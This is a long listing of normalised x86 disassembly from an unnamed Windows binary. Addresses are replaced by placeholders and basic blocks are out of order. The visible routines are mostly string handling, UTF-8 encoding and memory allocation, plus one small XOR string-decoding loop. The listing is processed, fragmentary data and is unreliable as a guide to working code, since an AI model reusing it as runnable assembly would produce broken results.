mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_1002788e
mov eax esi
sub_1004b7fe
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1001c548
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_1004b830
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_100616c6
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_100616c6
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
call sub_1004d5e0
test edi edi
je r-xdata
cmp edi 0x1
jne r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov cl [ ebp + 0xc ]
mov eax esi
mov [ eax ] cl
jmp r-xdata
mov eax [ esi ]
mov cl [ ebp + 0xc ]
mov [ eax ] cl
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
movsx edx [ ebp + 0xc ]
push edi
push edx
push eax
call sub_10078970
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1004b8f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008148a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1c ] edi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + edi + 0xc ] ebx
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp [ eax + edi + 0xc ] ebx
sete cl
mov [ ebp - 0x18 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
jne r-xdata
mov eax [ eax + edi + 0x3c ]
cmp eax ebx
je r-xdata
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ eax + edi + 0x38 ]
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov edx [ edx + 0x24 ]
push ebx
push esi
push eax
call edx
cmp eax esi
jne r-xdata
mov edx 0x4
jmp r-xdata
mov esi eax
call sub_10064ff0
mov [ ebp - 0x14 ] 0x4
cmp edx ebx
je r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
test edx edx
je r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0x4
call j_sub_10030adf
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + edi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_1005e2c0
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
push 0x0
call sub_10007bc0
sub_1004b9ab
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
push 0x1
call sub_10007bc0
sub_1004ba5c
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10039d7a
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_1004ba90
push ebp
mov ebp esp
sub esp 0x234
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x22c ] eax
mov eax [ ebp + 0x8 ]
push eax
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x230 ] edx
call sub_10003910
add esp 0x4
test eax eax
mov eax 0x2
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
lea edx [ ebp - 0x224 ]
call sub_10050930
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x208
lea ecx [ ebp - 0x21c ]
push 0x0
push ecx
call sub_10078970
lea edx [ ebp - 0x220 ]
push edx
call sub_1000b569
mov ecx [ ebp - 0x220 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x220 ] ecx
imul ecx ecx 0x208
lea ebx [ ecx + eax + 0x1082c ]
add esp 0x10
mov ecx 0x104
lea eax [ ebp - 0x21c ]
xor esi esi
nop
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x21c ]
push ebx
mov edx 0x7fffffff
call sub_1006b860
lea eax [ ebp - 0x224 ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea edx [ ebp - 0x220 ]
push edx
call sub_1000b569
mov ecx [ ebp - 0x220 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x220 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ecx [ ecx + eax + 0x11c7c ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x21c ]
call sub_10030af0
test eax eax
je r-xdata
lea ecx [ ebp - 0x224 ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x21c ]
call sub_10030af0
test eax eax
jne r-xdata
lea edx [ ebp - 0x14 ]
xor eax eax
call sub_10050930
mov eax [ ebp - 0x22c ]
push edx
mov edx [ ebp - 0x228 ]
push eax
lea ecx [ ebp - 0x21c ]
push ecx
mov ecx [ ebp - 0x230 ]
push edx
mov edx [ ebp + 0x8 ]
call sub_10031620
add esp 0x10
neg eax
pop edi
sbb eax eax
pop esi
and eax 0x4
pop ebx
sub_1004bc90
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x20 ]
mov [ ebx ] eax
mov [ esi ] ecx
mov edx [ ebx ]
push edi
cmp edx [ ebp + 0x10 ]
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
cmp ecx [ ebx ]
pop edi
pop esi
sete al
pop ebx
pop ebp
retn 0x1c
mov edi [ ebp + 0x1c ]
cmp [ esi ] edi
je r-xdata
mov eax [ ebx ]
movzx edx [ eax ]
cmp edx 0x10ffff
ja r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x1c
cmp edx 0x80
jae r-xdata
mov ecx edx
cmp edx 0x800
jae r-xdata
mov cl dl
xor eax eax
jmp r-xdata
cmp edx 0x10000
jae r-xdata
shr ecx 0x6
or cl 0xc0
mov eax 0x1
jmp r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebx ] 0x0
jne r-xdata
cmp edx 0x200000
jae r-xdata
shr ecx 0xc
or cl 0xe0
mov eax 0x2
jmp r-xdata
sub edi [ esi ]
lea ebx [ eax + 0x1 ]
cmp edi ebx
mov ebx [ ebp + 0x14 ]
jl r-xdata
mov [ ebx ] 0x1
cmp edx 0x4000000
jae r-xdata
shr ecx 0x12
or cl 0xf0
mov eax 0x3
jmp r-xdata
add [ ebx ] 0x2
mov edi [ esi ]
mov [ edi ] cl
inc [ esi ]
mov edi [ esi ]
test eax eax
jle r-xdata
shr ecx 0x1e
or cl 0xfc
mov eax 0x5
shr ecx 0x18
or cl 0xf8
mov eax 0x4
jmp r-xdata
mov edx [ ebx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
lea ecx [ eax + eax * 2 ]
add ecx ecx
jmp r-xdata
sub ecx 0x6
mov ebx edx
shr ebx cl
dec eax
mov [ ebp + 0x20 ] ecx
and bl 0x3f
or bl 0x80
mov [ edi ] bl
inc [ esi ]
mov edi [ esi ]
test eax eax
jg r-xdata
mov ecx [ ebp + 0x20 ]
mov ebx [ ebp + 0x14 ]
sub_1004bdc0
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x1
jne r-xdata
cmp [ eax + 0x14 ] 0x8
jb r-xdata
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov edx [ ebp + 0x8 ]
push edi
lea edi [ eax + edx * 2 ]
test ecx ecx
je r-xdata
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov dx [ ebp + 0x10 ]
mov [ eax + ecx * 2 ] dx
pop ebp
retn 0xc
mov eax [ eax ]
pop edi
pop ebp
retn 0xc
mov eax [ ebp + 0x10 ]
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
sub_1004be20
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f391
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov esi ecx
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0x4 ] 0x2
cmp esi ebx
jne r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0xa6
call sub_1001bb80
push esi
lea edx [ ebp - 0xac ]
lea ecx [ ebp - 0x3c ]
call sub_10053a60
test eax eax
jne r-xdata
lea esi [ ebp - 0xbc ]
call sub_100173d0
lea esi [ ebp - 0xb4 ]
call sub_100173d0
lea esi [ ebp - 0xac ]
call sub_100173d0
lea eax [ ebx + 0x1 ]
jmp r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x23
call sub_1001bb80
push esi
lea edx [ ebp - 0xb4 ]
lea ecx [ ebp - 0xa4 ]
call sub_10053a60
test eax eax
jne r-xdata
mov eax [ ebp - 0xac ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x70 ]
mov eax 0x51
call sub_1001bb80
push esi
lea edx [ ebp - 0xbc ]
lea ecx [ ebp - 0x70 ]
call sub_10053a60
test eax eax
jne r-xdata
mov eax [ ebp - 0xb4 ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
lea esi [ ebp - 0xbc ]
call sub_100173d0
lea esi [ ebp - 0xb4 ]
call sub_100173d0
lea esi [ ebp - 0xac ]
call sub_100173d0
xor eax eax
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
mov edi edi
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
mov esi [ ebp - 0xc0 ]
lea esi [ ebp - 0xbc ]
call sub_100173d0
lea esi [ ebp - 0xb4 ]
call sub_100173d0
lea esi [ ebp - 0xac ]
call sub_100173d0
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
mov esi [ ebp - 0xc0 ]
lea esi [ ebp - 0xbc ]
call sub_100173d0
lea esi [ ebp - 0xb4 ]
call sub_100173d0
lea esi [ ebp - 0xac ]
call sub_100173d0
mov eax 0x3
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
lea esi [ ebp - 0xbc ]
call sub_100173d0
lea esi [ ebp - 0xb4 ]
call sub_100173d0
lea esi [ ebp - 0xac ]
call sub_100173d0
mov eax 0x4
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_1004c0d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100812e1
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0xc ]
lea edi [ ecx + 0x10 ]
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
add esi 0x24
add edi 0x24
jmp r-xdata
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
cmp esi eax
je r-xdata
lea eax [ edi - 0x10 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov edx [ edi + 0xc ]
mov [ esi + 0x1c ] edx
mov eax [ edi + 0x10 ]
mov [ esi + 0x20 ] eax
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] ebx
xor edx edx
mov [ esi + 0x10 ] 0x0
mov [ esi ] dx
cmp [ edi + 0x4 ] 0x8
lea ebx [ edi - 0x10 ]
jae r-xdata
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ ebx ]
mov [ esi ] ecx
mov [ ebx ] edx
mov eax [ edi ]
inc eax
add eax eax
push eax
push ebx
push esi
call sub_10077d10
add esp 0xc
jmp r-xdata
mov edx [ edi ]
mov [ esi + 0x10 ] edx
mov eax [ edi + 0x4 ]
mov [ esi + 0x14 ] eax
xor ecx ecx
mov [ edi + 0x4 ] 0x7
mov [ edi ] 0x0
mov [ ebx ] cx
sub_1004c1c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f7f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ edi ]
test esi esi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov esi eax
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ esi + 0x4 ] eax
mov esi eax
test esi esi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx eax
call sub_10032900
jmp r-xdata
push 0x40
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea eax [ esi + 0x1 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ esi + 0x4 ] 0x0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
je r-xdata
sub_1004c2a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
add eax [ ebx + 0x4 ]
push edi
mov edi ecx
cmp edi eax
jae r-xdata
cmp edi ecx
je r-xdata
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov ecx [ esi + 0x4 ]
mov eax [ ebx ]
add ecx [ esi ]
push edx
push eax
push ecx
call sub_10078600
mov edx [ ebx + 0x4 ]
add esp 0xc
add [ esi + 0x4 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push edi
push eax
call sub_10024af0
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ecx
mov ebx eax
push edx
push ebx
call sub_10078600
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10030ff0
mov [ esi ] ebx
mov ebx [ ebp + 0xc ]
add esp 0x1c
mov [ esi + 0x8 ] edi
add edi edi
cmp edi eax
jb r-xdata
sub_1004c320
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffef
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
push 0x1
xor eax eax
lea edx [ esi + 0x13c ]
push esi
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x8 ] ax
call sub_1006a680
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x80 ]
mov eax 0xd3
call sub_1000a6f0
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1004c3c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push ebx
push [ ebp + 0x1c ]
xor ebx ebx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] eax
call sub_10054678
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x14 ] bl
je r-xdata
push esi
mov esi [ ebp + 0x10 ]
mov [ eax ] bl
cmp esi ebx
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
mov eax [ ebp + 0x18 ]
cmp eax ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
xor eax eax
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] edi
cmp edi ebx
jbe r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0xd4 ]
pop edi
mov eax [ ebp - 0x10 ]
mov [ eax ] bl
cmp [ ebp - 0x8 ] ebx
jne r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
cmp al 0x25
je r-xdata
call sub_10012991
mov [ eax ] 0x22
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] bl
sub edi [ ebp - 0x4 ]
mov eax edi
cmp [ ebp - 0x14 ] bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
je r-xdata
lea ecx [ ebp - 0x20 ]
movsx eax al
push ecx
push eax
call sub_100551f3
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc esi
xor eax eax
cmp [ esi ] 0x23
jne r-xdata
mov al [ esi ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
inc [ ebp + 0x8 ]
inc esi
dec [ ebp - 0x4 ]
jmp r-xdata
xor ecx ecx
inc ecx
cmp [ ebp - 0x4 ] ecx
jbe r-xdata
push eax
push [ ebp - 0xc ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push eax
mov al [ esi ]
lea edx [ ebp + 0x8 ]
call sub_1007ce65
add esp 0x10
test eax eax
je r-xdata
inc eax
inc esi
cmp [ ebp - 0x4 ] ebx
ja r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
inc esi
mov [ ebp - 0x8 ] ecx
mov cl [ esi ]
mov edx [ ebp + 0x8 ]
mov [ edx ] cl
inc [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
mov esi eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub_1004c570
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push edi
mov edi [ esi + 0x4 ]
push ecx
call sub_1005e020
mov edx [ esi ]
push edx
call sub_10065045
add esp 0x8
pop edi
sub_1004c5ab
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_1002836c
dec [ ebp + 0x1c ]
add esi 0x2
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_1004c5f0
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x88888889
imul esi
add edx esi
sar edx 0x5
mov esi edx
shr esi 0x1f
add esi edx
push edi
cmp esi 0x4444443
jbe r-xdata
mov edi [ ecx + 0x8 ]
sub edi ebx
mov eax 0x88888889
imul edi
add edx edi
sar edx 0x5
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_100616c6
pop edi
pop esi
pop ebx
retn
mov edx eax
shr edx 0x1
mov edi 0x4444444
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_1001a390
mov eax esi
cmp eax esi
jae r-xdata
sub_1004c670
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fe48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_100067d1
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_1005b9b6
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_1002470e
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_1005d7b0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_100067d1
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_10036aac
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_1002050e
lea ecx [ ebp + 0x8 ]
call sub_1002470e
push esi
call sub_10009b69
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_1004c7bd
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x14 ]
push eax
push 0x0
push 0x3a
call sub_1005e05a
mov ebx [ ebp + 0x24 ]
movzx eax ax
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x8 ]
push eax
push 0x17
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001150f
mov esi [ ebp + 0x20 ]
add esp 0x24
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
mov ax [ ebp - 0x4 ]
cmp [ ebp + 0x12 ] ax
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
lea ecx [ ebp + 0xc ]
call sub_1001e1ec
lea eax [ ebx + 0x4 ]
push eax
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001150f
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1ec
push ebx
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001150f
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_1004c8a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fcb1
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
